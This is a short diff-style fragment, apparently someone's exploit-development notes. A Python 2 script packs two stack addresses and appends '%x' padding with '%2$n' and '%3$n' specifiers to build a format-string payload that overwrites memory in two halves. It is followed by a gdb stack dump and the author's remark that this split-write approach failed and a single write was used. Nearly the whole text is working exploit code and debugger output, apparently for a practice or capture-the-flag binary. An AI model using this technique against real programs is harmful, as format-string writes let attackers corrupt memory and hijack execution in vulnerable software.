@@ -1,0 +1,22 @@
+  1  
+  2 import struct
+  3  
+  4 string = struct.pack("I",0xffffd618)
+  5 string += struct.pack("I",0xffffd618 +2)
+  6 string += "%34588x" + "%2$n"
+  7 string += "%32992x" + "%3$n"
+  8  
+  9 print string
+
+
+output ::
+
+(gdb) x/10x $esp
+0xffffd608:     0x080486ff      0xffffd618      0xffffd61a      0x20202020
+0xffffd618:     0x08048724      0x20200001      0x20202020      0x20202020
+0xffffd628:     0x20202020      0x20202020
+
+this method didnt work as i didnt allow me to change d608 with line 5, i think this is due to the overlap into 0xffffd604
+so i used the single method
+
+
